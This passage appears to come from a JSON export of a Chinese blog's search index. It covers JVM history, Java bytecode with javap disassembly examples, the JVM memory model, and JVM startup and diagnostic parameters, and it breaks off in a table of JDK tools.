程序的时候，真真正正在执行的是一个叫做 Java 虚拟机的进程。\n\n### 虚拟机的退出\n\n有如下的几种情况：\n\n- 程序正常执行结束；\n- 程序在执行过程中遇到了异常或错误而异常终止；\n- 由于操作系统出现错误而导致 Java 虚拟机进程终止；\n- 某线程调用 Runtime 类或 System 类的 exit 方法，或 Runtime 类的 halt 方法，并且 Java 安全管理器也允许这次 exit 或者 halt 操作；\n- 除此之外，JNI（Java Native Interface）规范中描述了用 JNI Invocation API 来加载或卸载 Java 虚拟机时 Java 虚拟机的退出情况。\n\n## JVM 发展历程\n\n### Sun Classic VM\n\n- 早在 1996 年 Java 1.0 版本的时候，Sun 公司发布了一款名为 Sun Classic VM 的 Java 虚拟机，它同时也是世界上第一款商用 Java 虚拟机，JDK 1.4 时完全被淘汰。\n- 这款虚拟机内部只提供解释器。\n- 如果使用 JIT 编译器，就需要进行外挂。但是一旦使用了 JIT 编译器，JIT 就会接管虚拟机的执行系统。解释器就不再工作。解释器和编译器不能配合工作。\n- 现在 HotSpot 内置了此虚拟机。\n\n### Exact VM\n\n- 为了解决上一个虚拟机问题，JDK 1.2 时，Sun 提供了此虚拟机；\n- Exact Memory Management: 准确式内存管理；\n  - 也可以叫 Non-Conservative/Accurate Memory Management\n  - 虚拟机可以知道内存中某个位置的数据具体是什么类型\n- 具备现代高性能虚拟机的雏形\n  - 热点探测\n  - 编译器与解释器混合工作模式\n- 只在 Solaris 平台短暂使用，其他平台上还是 Classic VM\n  - 英雄气短，终被 HotSpot 虚拟机替换\n\n### HotSpot\n\n- HotSpot 历史\n  - 最初由一家名为 Longview Technologies 的小公司设计\n  - 1997 年，此公司被 Sun 收购；2009 年，Sun 公司被 Oracle 收购\n  - JDK 1.3 时，HotSpot VM 成为默认虚拟机\n- 目前 HotSpot 占有绝对的市场地位，称霸武林\n  - 现在使用比较多的 JDK 8、JDK 11中默认的虚拟机是 HotSpot\n  - Sun/Oracle JDk 和 OpenJDK 的默认虚拟机\n- 从服务端、桌面端、嵌入式都有应用\n- 名称中的 HotSpot 指的就是它的热点代码探测技术\n  - 通过计数器找到最具编译价值代码，触发即时编译或栈上替换\n  - 通过编译器与解释器协同工作，在最优的程序响应时间与最佳执行性能中取得平衡\n\n### BEA 的 JRockit\n\n- 专注于服务器应用\n  - 它可以不太关注程序启动速度，因此 JRockit 内部不包含解释器实现，全部代码都是靠即时编译器编译后执行\n- 大量的行业基准测试显示，JRockit JVM 是世界上最快的 JVM。\n  - 使用 JRockit 产品，客户已经体验带了显著的性能提高（一些超过了 70%）和硬件成本的减少（达50%）。\n- 优势：全面的 Java 运行时解决方案组合\n  - JRockit 面向延迟敏感型应用的解决方案 JRockit Real Time 提供以毫秒或微秒级的 JVM 响应时间，适合财务，军事指挥，电信网络的需要。\n  - MissionControl 服务套件，它是一组以极低的开销来监控、管理和分析生产环境中的应用程序的工具。\n- 2008年，BEA 被 Oracle 收购\n\n### IBM 的 J9\n\n- 全称：IBM Technology for Java Virtual Machine，简称 IT4J，内部代号 J9\n- 市场定位与 HotSpot 接近，服务端、桌面应用、嵌入式等多用途 VM\n- 广泛应用于 IBM 的各种 Java 产品\n- 目前，有影响力的三大商用虚拟机之一，也号称是世界上最快的虚拟机。\n- 2017左右，IBM 发布了开源 J9 VM，命名为 OpenJ9，交给 Eclipse 基金会管理，也称为 Eclipse OpenJ9","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"Java 进阶 02 —— 是时候了解一下 Java 字节码了","url":"/java-advance/02-jvm-bytecode/","content":"\n## 什么是字节码？\n\n- 我们平时所说的 Java 字节码，指的是用 Java 语言编译成的字节码。准确的说能在 JVM 平台上执行的字节码格式都是一样的。所以应该统称为 JVM 字节码。\n- 不同的编译器，可以编译出相同的字节码文件，字节码文件也可以在不同的 JVM 上运行。\n- Java 虚拟机与 Java 语言并没有必然的联系，它只与特定的二进制文件格式 .class 文件格式所关联，.class 文件中包含了 Java 虚拟机指令集（或者称为字节码、Bytecodes）和符号表，还有一些其他的辅助信息。\n- Java bytecode 由单字节（byte）的指令组成，理论上最多支持 256 个操作码（opcode）。 实际上 Java 只使用了200左右的操作码，还有一些操作码则保留给调试操作。详情见：\n\n- [JVM 指令集对照表](https://yonghong.tech/2021/01/jvm-instruction-set/)\n\n<!-- more -->\n\n根据指令的性质，主要分为四个大类：\n\n1. 栈操作指令，包括与局部变量交互的指令\n2. 程序流程控制指令\n3. 对象操作指令，包括方法调用指令\n4. 算术运算以及类型转换指令\n\n举个简单的例子：\n\n```java\npublic class HelloByteCode {\n    public static void main(String[] args) {\n        HelloByteCode obj = new HelloByteCode();\n    }\n}\n```\n\n```shell\n$ javac -g HelloByteCode.java\n$ javap -c -v HelloByteCode\nClassfile /Users/yonghong/Coding/code-lab/gtu-java/week01/HelloByteCode.class\n  Last modified 2021-1-7; size 415 bytes\n  MD5 checksum 44dd68d97fffda0bd16a524fb32b983a\n  Compiled from \"HelloByteCode.java\"\npublic class HelloByteCode\n  minor version: 0\n  major version: 52   // 52 对应 Java 8\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:        // 常量池\n   #1 = Methodref          #4.#19         // java/lang/Object.\"<init>\":()V\n   #2 = Class              #20            // HelloByteCode\n   #3 = Methodref          #2.#19         // HelloByteCode.\"<init>\":()V\n   #4 = Class              #21            // java/lang/Object\n   #5 = Utf8               <init>\n   #6 = Utf8               ()V\n   #7 = Utf8               Code\n   #8 = Utf8               LineNumberTable\n   #9 = Utf8               LocalVariableTable\n  #10 = Utf8               this\n  #11 = Utf8               LHelloByteCode;\n  #12 = Utf8               main\n  #13 = Utf8               ([Ljava/lang/String;)V\n  #14 = Utf8               args\n  #15 = Utf8               [Ljava/lang/String;\n  #16 = Utf8               obj\n  #17 = Utf8               SourceFile\n  #18 = Utf8               HelloByteCode.java\n  #19 = NameAndType        #5:#6          // \"<init>\":()V\n  #20 = Utf8               HelloByteCode\n  #21 = Utf8               java/lang/Object\n{\n  public HelloByteCode();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n         4: return\n      LineNumberTable:\n        line 1: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   LHelloByteCode;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=2, locals=2, args_size=1\n         0: new           #2                  // class HelloByteCode\n         3: dup\n         4: invokespecial #3                  // Method \"<init>\":()V\n         7: astore_1\n         8: return\n      LineNumberTable:\n        line 3: 0   // new 指令在源码的第 3 行\n        line 4: 8   // return 指令在源码的第 4 行\n      LocalVariableTable:   // 本地变量表\n        Start  Length  Slot  Name   Signature\n      // 起作用的行  生效范围  槽数  变量名称  变量类型签名\n            0       9     0  args   [Ljava/lang/String;\n            8       1     1   obj   LHelloByteCode;\n}\nSourceFile: \"HelloByteCode.java\"\n```\n\n### javac 与 javap\n\njavac 的用法\n\n```shell\n$ javac -help\n用法: javac <options> <source files>\n其中, 可能的选项包括:\n  -g                         生成所有调试信息\n  -g:none                    不生成任何调试信息\n  -g:{lines,vars,source}     只生成某些调试信息\n  -nowarn                    不生成任何警告\n  -verbose                   输出有关编译器正在执行的操作的消息\n  -deprecation               输出使用已过时的 API 的源位置\n  -classpath <路径>            指定查找用户类文件和注释处理程序的位置\n  -cp <路径>                   指定查找用户类文件和注释处理程序的位置\n  -sourcepath <路径>           指定查找输入源文件的位置\n  -bootclasspath <路径>        覆盖引导类文件的位置\n  -extdirs <目录>              覆盖所安装扩展的位置\n  -endorseddirs <目录>         覆盖签名的标准路径的位置\n  -proc:{none,only}          控制是否执行注释处理和/或编译。\n  -processor <class1>[,<class2>,<class3>...] 要运行的注释处理程序的名称; 绕过默认的搜索进程\n  -processorpath <路径>        指定查找注释处理程序的位置\n  -parameters                生成元数据以用于方法参数的反射\n  -d <目录>                    指定放置生成的类文件的位置\n  -s <目录>                    指定放置生成的源文件的位置\n  -h <目录>                    指定放置生成的本机标头文件的位置\n  -implicit:{none,class}     指定是否为隐式引用文件生成类文件\n  -encoding <编码>             指定源文件使用的字符编码\n  -source <发行版>              提供与指定发行版的源兼容性\n  -target <发行版>              生成特定 VM 版本的类文件\n  -profile <配置文件>            请确保使用的 API 在指定的配置文件中可用\n  -version                   版本信息\n  -help                      输出标准选项的提要\n  -A关键字[=值]                  传递给注释处理程序的选项\n  -X                         输出非标准选项的提要\n  -J<标记>                     直接将 <标记> 传递给运行时系统\n  -Werror                    出现警告时终止编译\n  @<文件名>                     从文件读取选项和文件名\n```\n\njavap 的用法\n\n```shell\n$ javap -help\n用法: javap <options> <classes>\n其中, 可能的选项包括:\n  -help  --help  -?        输出此用法消息\n  -version                 版本信息\n  -v  -verbose             输出附加信息\n  -l                       输出行号和本地变量表\n  -public                  仅显示公共类和成员\n  -protected               显示受保护的/公共类和成员\n  -package                 显示程序包/受保护的/公共类\n                           和成员 (默认)\n  -p  -private             显示所有类和成员\n  -c                       对代码进行反汇编\n  -s                       输出内部类型签名\n  -sysinfo                 显示正在处理的类的\n                           系统信息 (路径, 大小, 日期, MD5 散列)\n  -constants               显示最终常量\n  -classpath <path>        指定查找用户类文件的位置\n  -cp <path>               指定查找用户类文件的位置\n  -bootclasspath <path>    覆盖引导类文件的位置\n```\n\n## 字节码的运行时结构\n\nJVM 是一台基于栈的计算机器。\n\n每个线程都有一个独属于自己的线程栈（JVM Stack），用于存储 栈帧（Frame）。 每一次方法调用，JVM 都会自动创建一个栈帧。栈帧由操作数栈，局部变量数组以及一个 Class 引用组成。Class 引用指向当前方法在运行时常量池中对应的 Class。\n\n## 从助记符到二进制\n\n![从助记符到二进制](https://up-img.yonghong.tech/pic/2021/04/02-20-05-%E4%BB%8E%E5%8A%A9%E8%AE%B0%E7%AC%A6%E5%88%B0%E4%BA%8C%E8%BF%9B%E5%88%B6-1rl8Dp.png)\n\n## 四则运行的例子\n\nMovingAverage.java\n\n```java\npublic class MovingAverage {\n    private int count = 0;\n    private double sum = 0.0D;\n\n    public void submit(double value) {\n        this.count++;\n        this.sum += value;\n    }\n\n    public double getAvg() {\n        if (0 == this.count) {\n            return sum;\n        }\n        return this.sum / this.count;\n    }\n}\n```\n\nLocalVaribleTest.java\n\n```java\npublic class LocalVaribleTest {\n    public static void main(String[] args) {\n        MovingAverage ma = new MovingAverage();\n        int num1 = 1;\n        int num2 = 2;\n        ma.submit(num1);\n        ma.submit(num2);\n        double avg = ma.getAvg();\n    }\n}\n```\n\n```shell\n$ javap -c MovingAverage\nCompiled from \"MovingAverage.java\"\npublic class MovingAverage {\n  public MovingAverage();\n    Code:\n       0: aload_0\n       1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n       4: aload_0\n       5: iconst_0\n       6: putfield      #2                  // Field count:I\n       9: aload_0\n      10: dconst_0\n      11: putfield      #3                  // Field sum:D\n      14: return\n\n  public void submit(double);\n    Code:\n       0: aload_0\n       1: dup\n       2: getfield      #2                  // Field count:I\n       5: iconst_1\n       6: iadd\n       7: putfield      #2                  // Field count:I\n      10: aload_0\n      11: dup\n      12: getfield      #3                  // Field sum:D\n      15: dload_1\n      16: dadd\n      17: putfield      #3                  // Field sum:D\n      20: return\n\n  public double getAvg();\n    Code:\n       0: iconst_0\n       1: aload_0\n       2: getfield      #2                  // Field count:I\n       5: if_icmpne     13\n       8: aload_0\n       9: getfield      #3                  // Field sum:D\n      12: dreturn\n      13: aload_0\n      14: getfield      #3                  // Field sum:D\n      17: aload_0\n      18: getfield      #2                  // Field count:I\n      21: i2d\n      22: ddiv\n      23: dreturn\n}\n\n$ javap -c LocalVaribleTest\nCompiled from \"LocalVaribleTest.java\"\npublic class LocalVaribleTest {\n  public LocalVaribleTest();\n    Code:\n       0: aload_0\n       1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n       4: return\n\n  public static void main(java.lang.String[]);\n    Code:\n       0: new           #2                  // class MovingAverage\n       3: dup\n       4: invokespecial #3                  // Method MovingAverage.\"<init>\":()V\n       7: astore_1\n       8: iconst_1\n       9: istore_2\n      10: iconst_2\n      11: istore_3\n      12: aload_1\n      13: iload_2\n      14: i2d   // int 转成 double 隐式转换\n      15: invokevirtual #4                  // Method MovingAverage.submit:(D)V\n      18: aload_1\n      19: iload_3\n      20: i2d\n      21: invokevirtual #4                  // Method MovingAverage.submit:(D)V\n      24: aload_1\n      25: invokevirtual #5                  // Method MovingAverage.getAvg:()D\n      28: dstore        4\n      30: return\n}\n```\n\n## 算数操作与类型转换\n\n![算数操作与类型转换](https://up-img.yonghong.tech/pic/2021/04/02-20-09-01-%E7%AE%97%E6%95%B0%E6%93%8D%E4%BD%9C%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2-D45qpJ.png)\n\n## 一个完整的循环控制\n\n```java\npublic class ForLoopTest {\n    private static int[] nums = {1, 6, 8};\n    public static void main(String[] args) {\n        MovingAverage ma = new MovingAverage();\n        for (int num : nums) {\n            ma.submit(num);\n        }\n        double avg = ma.getAvg();\n    }\n}\n```\n\n```shell\n$ javap -c ForLoopTest\nCompiled from \"ForLoopTest.java\"\npublic class ForLoopTest {\n  public ForLoopTest();\n    Code:\n       0: aload_0\n       1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n       4: return\n\n  public static void main(java.lang.String[]);\n    Code:\n       0: new           #2                  // class MovingAverage\n       3: dup\n       4: invokespecial #3                  // Method MovingAverage.\"<init>\":()V\n       7: astore_1\n       8: getstatic     #4                  // Field nums:[I\n      11: astore_2\n      12: aload_2\n      13: arraylength\n      14: istore_3\n      15: iconst_0                // 初始化变量 0\n      16: istore        4         // 存储到本地变量表 4 槽位\n      18: iload         4         // 加载 4 槽位 到操作数栈\n      20: iload_3                 // 加载 int 3 到操作数栈\n      21: if_icmpge     43        // 比较，如果大于等于跳转到 43 行指令\n      24: aload_2\n      25: iload         4\n      27: iaload\n      28: istore        5\n      30: aload_1\n      31: iload         5\n      33: i2d\n      34: invokevirtual #5                  // Method MovingAverage.submit:(D)V\n      37: iinc          4, 1      // 4 槽位上加 1\n      40: goto          18        // goto 18 行指令\n      43: aload_1\n      44: invokevirtual #6                  // Method MovingAverage.getAvg:()D\n      47: dstore_2\n      48: return\n\n  static {};\n    Code:\n       0: iconst_3\n       1: newarray       int\n       3: dup\n       4: iconst_0\n       5: iconst_1\n       6: iastore\n       7: dup\n       8: iconst_1\n       9: bipush        6\n      11: iastore\n      12: dup\n      13: iconst_2\n      14: bipush        8\n      16: iastore\n      17: putstatic     #4                  // Field nums:[I\n      20: return\n}\n```\n\n## 方法调用的指令\n\n- invokestatic，顾名思义，这个指令用于调用某个类的静态方法，这是方法调用指令中最快的一个。\n- invokespecial, 用来调用构造函数，但也可以用于调用同一个类中的 private 方法, 以及可见的超类方法。\n- invokevirtual，如果是具体类型的目标对象，invokevirtual 用于调用公共，受保护和 package 级的私有方法。\n- invokeinterface，当通过接口引用来调用方法时，将会编译为 invokeinterface 指令。\n- invokedynamic，JDK7 新增加的指令，是实现“动态类型语言”（Dynamically Typed Language）支持而进行的升级改进，同时也是 JDK8 以后支持 lambda 表达式的实现基础。\n","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"Java 进阶 04 —— JVM 内存模型：堆和栈是什么？","url":"/java-advance/04-jvm-mem/","content":"\n## JVM 运行时数据区概述\n\n内存是非常重要的系统资源，是硬盘和 CPU 的中间仓库及桥梁，承载着操作系统和应用程序的实时运行。JVM 内存布局规定了 Java 在运行过程中内存申请、分配、管理的策略，保证了 JVM 的高效稳定运行。不同的 JVM 对于内存的划分方式和管理机制存在着部分差异。结合 JVM 虚拟机规范，来讨论一下经典的 JVM 内存布局。\n\nJava 虚拟机定义了若干种程序运行期间会使用到的运行时数据区，其中有一些会随着虚拟机启动而创建，随着虚拟机退出而销毁。而另外一些则是与线程一一对应的，这些与线对应的数据区域会随着线程开始和结束而创建和销毁。\n\n<!-- more -->\n\n### JVM 整体架构\n\n![JVM 整体架构 - 英文](https://up-img.yonghong.tech/pic/2021/04/03-19-47-VusNfO-S1kg66.png)\n\n---\n\n![JVM 整体架构 - 中文](https://up-img.yonghong.tech/pic/2021/04/03-19-46-8oddUR-oMwPkk.png)\n\n\n### JVM 系统线程\n\n线程是一个程序里的运行单元。JVM 允许一个应用有多个线程并行的执行\n\n在 HotSpot 虚拟机里，每个线程都与操作系统的本地线程直接映射。当一个 Java 线程准备好执行以后，此时一个操作系统的本地线程也同时创建。Java 线程执行终止后，本地线程也会回收\n\n操作系统负责所有的线程的安排调度到任何一个可用的 CPU 上。一旦本地线程初始化成功，它就会调用 Java 线程中的人run() 方法\n\n如果你使用 jconsole 或者是任何一个调试工具，都能看到在后台有许多线程在运行。这些后台线程不包括调用 public static void main(String[] args) 的 main 线程以及所有这个 main 线程自己创建的线程。\n\n这些主要的后台系统线程在 HotSpot 虚拟机里主要是以下几个\n\n- 虚拟机线程：这种线程的操作是需要 JVM 达到安全点才会出现。这些操作必须在不同的线程中发生的原因是他们都需要 JVM 达到安全点，这样堆才不会变化。这种线程的执行类型包括“stop-the-world”的垃圾收集，线程栈收集，线程挂起以及偏向锁撤销\n- 周期任务线程：这种线程是时间周期事件的体现（比如中断），他们一般用于周期性操作的调度执行\n- GC 线程：这种线程对在 JVM 里不同种类的垃圾收集行为提供了支持\n- 编译线程：这种线程在运行时会将字节码编译成本地代码\n- 信号调度线程：这种线程接收信号并发送给 JVM，在它内部通过调用适当的方法进行处理\n\n\n## JVM 内存结构\n\n![JVM内存结构](https://up-img.yonghong.tech/pic/2021/04/02-20-39-01-JVM%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84-OjY1mD.png)\n\n- 每个线程只能访问自己的线程栈。\n- 每个线程都不能访问（看不见）其他线程的局部变量。\n- 所有原生类型的局部变量都存储在线程栈中，因此对其他线程是不可见的。\n- 线程可以将一个原生变量值的副本传给另一个线程，但不能共享原生局部变量本身。\n- 堆内存中包含了 Java 代码中创建的所有对象，不管是哪个线程创建的。其中也涵盖了包装类型（例如，Byte，Integer，Long等）。\n- 不管是创建一个对象并将其值赋值给局部变量，还是赋值给另一个对象的成员变量，创建的对象都会被保存到堆内存中。\n\n---\n\n- 如果是原生数据类型的局部变量，那么它的内容就全部保留在线程栈上。 \n- 如果是对象引用，则栈中的局部变量槽位中保存着对象的引用地址，而实际的对象内容保存在堆中。\n- 对象的成员变量与对象本身一起存储在堆上，不管成员变量的类型是原生数据类型，还是对象引用。\n- 类的静态原生变量和静态变量对象的引用则和类定义一样都保存在方法区中。类的静态变量对象的值保存在堆中。\n\n---\n\n- 总结一下：方法中使用的原生数据类型和对象引用地址在栈上存储；对象、对象成员与类静态变量对象的值在堆上；类定义、静态原生变量、静态对象的引用在方法区中。\n- 堆内存又称为“共享堆”，堆中的所有对象，可以被所有线程访问，只要他们能拿到对象的引用地址。\n- 如果一个线程可以访问某个对象时，也就可以访问该对象的成员变量。\n- 如果两个线程同时调用某个对象的同一方法，则它们都可以访问到这个对象的成员变量，但每个线程的局部变量副本是独立的。\n\n\n## JVM 内存整体结构\n\n![JVM内存整体结构](https://up-img.yonghong.tech/pic/2021/04/02-20-41-01-JVM%E5%86%85%E5%AD%98%E6%95%B4%E4%BD%93%E7%BB%93%E6%9E%84-eSeqP8.png)\n\n- 每启动一个线程，JVM就会在栈空间栈分配对应的线程栈，比如 1MB 空间（-Xss1m） \n- 线程栈也叫做 Java 方法栈。如果使用了 JNI 方法，则会分配一个单独的本地方法栈（Native Stack） \n- 线程执行过程中，一般会有多个方法组成调用栈（Stack Trace），比如 A 调用 B，B 调用 C 。每执行到一个方法，就会创建对应的栈帧（Frame）。\n\n\n## JVM 栈内存机构\n\n![JVM栈内存结构](https://up-img.yonghong.tech/pic/2021/04/02-20-44-01-JVM%E6%A0%88%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84-Z8QlQS.png)\n\n- 栈帧是一个逻辑上的概念，具体的大小在一个方法编写完成后基本上就能确定。 \n- 比如返回值，需要有一个空间存放吧，每个局部变量都需要对应的地址空间，此外还有给指令使用的操作数栈，以及 Class 指针（标识这个栈帧对应的是哪个类的方法，指向非堆里面的 Class 对象）。\n\n## JVM 堆内存结构\n\n![JVM堆内存结构](https://up-img.yonghong.tech/pic/2021/04/02-20-45-01-JVM%E5%A0%86%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84-0TRoeN.png)\n\n![jconsole内存](https://up-img.yonghong.tech/pic/2021/04/02-20-46-01-jconsole%E5%86%85%E5%AD%98-KNrKkU.png)\n\n- 堆内存是所有线程共用的内存空间，JVM 将 Heap 内存分为年轻代（Young generation）和老年代（Old generation，也叫 Tenured）两部分。\n- 年轻代还划分为3个内存池，伊甸园区（Eden space）和存活区（Survivor space），在大部分GC算法中有两个存活区（S0，S1），在我们可以观察到的任何时刻，S0和S1总有一个是空的，但一般很小，也浪费不了多少空间。\n- Non-Heap本质上还是Heap，只是一般不归GC管理，里面划分为3个内存区池。\n- Metaspace 以前叫持久代（永久代，Permanent generation），Java 换了个名字叫 Metaspace\n- CCS Compressed Class Space，存放 class 信息的，和 Metaspace 有交叉\n- Code Cache，存放 JIT 编译器编译后的本地机器代码。\n\n## CPU 与内存行为\n\n![计算机硬件架构](https://up-img.yonghong.tech/pic/2021/04/02-20-47-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E6%9E%B6%E6%9E%84-3aWMrH.png)\n\n- CPU 乱序执行\n- volatile 关键字\n- 原子性操作\n- 内存屏障\n\n## Java对象模型\n\n![Java对象模型](https://up-img.yonghong.tech/pic/2021/04/02-20-47-01-Java%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B-K1uNvD.png)\n\n\n## Java内存模型\n\n![Java内存模型](https://up-img.yonghong.tech/pic/2021/04/02-20-47-01-Java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B-G12dzM.jpg)\n\nJMM 规范对应的是 JSR-133 Java Memory Model and Thread Specification 《Java 语言规范》 $17.4 Memory Model 章节\n\nJMM 规范明确定义了不同的线程之间通过哪些方式，在什么时候可以看见其他线程保存到共享变量中的值；以及在必要时，如何对共享变量的访问进行同步。这样的好处是屏蔽各种硬件平台的操作系统之间的内存访问差异，实现了Java并发程序真正的跨平台。\n\n- 所有的对象（包括内部的实例成员变量），static 变量，以及数组，都必须存放到堆内存中。\n- 局部变量，方法的形参/入参，异常处理语句的入参不允许在线程之间共享，所以不受内存模型的影响。\n- 多个线程同时对一个变量访问时【读取/写入】，这时候只要有某个线程执行的是写操作，那么这种现象称之为“冲突”。\n- 可以被其他线程影响或感知的操作，称为线程间的交互行为，可分为：读取、写入、同步操作、外部操作等等。其中同步操作包括：对 volatile 变量的读写，对管程（monitor）的锁定与解锁，线程的起始操作与结尾操作，线程启动和结束等等。外部操作则是指对线程执行环境之外的操作，比如停止其他线程等等。\n- JMM 规范的是线程间的交互操作，而不管线程内部对局部变量进行的操作。\n\n---\n\n## JVM 启动参数\n\n- 以 - 开头为标准参数，所有的 JVM 都要实现这些参数，并且向后兼容。例，`-server`\n- -D 设置系统属性。例，`-Dfile.encoding=UTF-8`\n- 以 -X 开头为非标准参数，基本都是传给 JVM 的，默认 JVM 实现这些参数的功能，但是并不保证所有 JVM 实现都满足，且不保证向后兼容。可以使用 `java -X` 命令来查看当前 JVM 支持的非标准参数。例，`-Xmx8g`\n- 以 -XX: 开头为非稳定参数，专门用于控制 JVM 的行为，跟具体的 JVM 实现有关，随时可能会在下个版本取消。\n  - -XX: +-Flags 形式，+-是对布尔值进行开关。例，`-XX:+UseG1GC`\n  - -XX: key=value 形式，指定某个选项的值。例，`-XX:MaxPermSize=256m`\n\n1.系统属性参数\n\n```java\n-Dfile.encoding=UTF-8\n-Duser.timezone=GMT+08\n-Dmaven.test.skip=true\n-Dio.netty.eventLoopThreads=8\n\n// 还可以这样\nSystem.setProperty(\"a\", \"A100\");\nString a = System.getProperty(\"a\");\n```\n\n2.运行模式参数\n\n- -server: 设置 JVM 使用 server 模式，特点是启动速度比较慢，但运行时性能和内存管理效率很高，适用于生产环境。在具有 64 位能力的 JDK 环境下将默认启用该模式，而忽略 -client 参数。\n- -client: JDK1.7 之前在32位的 x86 机器上的默认值是 -client 选项。设置 JVM 使用 client 模式，特点是启动速度比较快，但运行时性能和内存管理效率不高，通常用于客户端应用程序或者 PC 应用开发和调试。此外，我们知道 JVM 加载字节码后，可以解释执行，也可以编译成本地代码再执行，所以可以配置 JVM 对字节码的处理模式。\n- -Xint: 在解释模式(interpreted mode)下运行，-Xint 标记会强制 JVM 解释执行所有的字节码，这当然会降低运行速度，通常低10倍或更多。\n- -Xcomp: -Xcomp 参数与 -Xint 正好相反，JVM 在第一次使用时会把所有的字节码编译成本地代码，从而带来最大程度的优化。【注意预热】\n- -Xmixed: -Xmixed 是混合模式，将解释模式和编译模式进行混合使用，有 JVM 自己决定，这是 JVM 的默认模式，也是推荐模式。 我们使用 java -version 可以看到 mixed mode 等信息。\n\n3.堆内存设置参数\n\n- -Xmx, 指定最大堆内存。 如 -Xmx4g. 这只是限制了 Heap 部分的最大值为4g。这个内存不包括栈内存，也不包括堆外使用的内存。\n- -Xms, 指定堆内存空间的初始大小。 如 -Xms4g。 而且指定的内存大小，并不是操作系统实际分配的初始值，而是GC先规划好，用到才分配。专用服务器上需要保持 –Xms 和 –Xmx 一致，否则应用刚启动可能就有好几个 FullGC。 当两者配置不一致时，堆内存扩容可能会导致性能抖动。\n- -Xmn, 等价于 -XX:NewSize，使用 G1 垃圾收集器 不应该 设置该选项，在其他的某些业务场景下可以设置。官方建议设置为 -Xmx 的 1/2 ~ 1/4.\n- -XX:MaxPermSize=size, 这是 JDK1.7 之前使用的。Java8 默认允许的 Meta空间无限大，此参数无效。\n- -XX:MaxMetaspaceSize=size, Java8 默认不限制 Meta 空间, 一般不允许设置该选项。\n- -XX:MaxDirectMemorySize=size，系统可以使用的最大堆外内存，这个参数跟 -Dsun.nio.MaxDirectMemorySize 效果相同。\n- -Xss, 设置每个线程栈的字节数，影响栈的深度。 例如 -Xss1m 指定线程栈为 1MB，与-XX:ThreadStackSize=1m 等价\n\n1. 如果什么都不配置会如何?\n2. Xmx 是否与 Xms 设置相等?\n3. Xmx 设置为机器内存的什么比例合适?\n4. 作业: 画一下 Xmx、Xms、Xmn、Meta、DirectMemory、Xss 这些内存参数的关系\n\n4.GC设置参数\n\n- -XX:+UseG1GC:使用 G1 垃圾回收器 \n- -XX:+UseConcMarkSweepGC:使用 CMS 垃圾回收器 \n- -XX:+UseSerialGC:使用串行垃圾回收器 \n- -XX:+UseParallelGC:使用并行垃圾回收器\n- -XX:+UnlockExperimentalVMOptions -XX:+UseZGC // Java 11+\n- -XX:+UnlockExperimentalVMOptions -XX:+UseShenandoahGC // Java 12+\n\n各个 JVM 版本的默认 GC 是什么?\n\n5.分析诊断参数\n\n- -XX:+-HeapDumpOnOutOfMemoryError 选项, 当 OutOfMemoryError 产生，即内存溢出(堆内存或持久代)时，自动 Dump 堆内存。\n  - 示例用法: java -XX:+HeapDumpOnOutOfMemoryError -Xmx256m ConsumeHeap\n- -XX:HeapDumpPath 选项, 与 HeapDumpOnOutOfMemoryError 搭配使用, 指定内存溢出时 Dump 文件的目 录。如果没有指定则默认为启动 Java 程序的工作目录。\n  - 示例用法: java -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/usr/local/ ConsumeHeap \n  - 自动 Dump 的 hprof 文件会存储到 /usr/local/ 目录下\n- -XX:OnError 选项, 发生致命错误时(fatal error)执行的脚本。\n  - 例如, 写一个脚本来记录出错时间, 执行一些命令, 或者 curl 一下某个在线报警的 url. 示例用法:java -XX:OnError=\"gdb - %p\" MyApp\n  - 可以发现有一个 %p 的格式化字符串，表示进程 PID。\n- -XX:OnOutOfMemoryError 选项, 抛出 OutOfMemoryError 错误时执行的脚本。 \n- -XX:ErrorFile=filename 选项, 致命错误的日志文件名,绝对路径或者相对路径。\n- -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=1506，远程调试\n\n6.JavaAgent参数\n\nAgent 是 JVM 中的一项黑科技, 可以通过无侵入方式来做很多事情，比如注入 AOP 代码，执行统计等等，权限非常大。这里简单介绍一下配置选项，详细功能需要专门来讲。\n\n设置 agent 的语法如下:\n\n- -agentlib:libname[=options] 启用 native 方式的 agent, 参考 LD_LIBRARY_PATH 路径。\n- -agentpath:pathname[=options] 启用 native 方式的 agent。\n- -javaagent:jarpath[=options] 启用外部的 agent 库, 比如 pinpoint.jar 等等。\n- -Xnoagent 则是禁用所有 agent。 以下示例开启 CPU 使用时间抽样分析:\n  - JAVA_OPTS=\"-agentlib:hprof=cpu=samples,file=cpu.samples.log\"\n","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"Java 进阶 05 —— JVM 相关工具","url":"/java-advance/05-jvm-args-tools/","content":"\n## JVM 命令行工具\n\n| 工具 | 简介 |\n| :--: | -- |\n| java    | Java 应用的启动程序 |\n| javac   | JDK 内置的编译工具 |\n| javap   | 反编译 class 文件的工具 |\n| javadoc | 根据 Java 代码和标准注释,自动生成相关的API说明文档 |\n| javah   | JNI 开发时, 根据 java 代码生成需要的 .h文件。 |\n| extcheck| 检查某个 jar 文件和运行时扩展 jar 有没有版本冲突，很少使用 |\n| jdb     | Java Debugger ; 可以调试本地和远端程序, 属于 JPDA 中的一个 demo 实现, 供其他调试器参考。开发时很使用 |\n| jdeps   | 探测 class 或 jar 包需要的依赖 |\n| jar     | 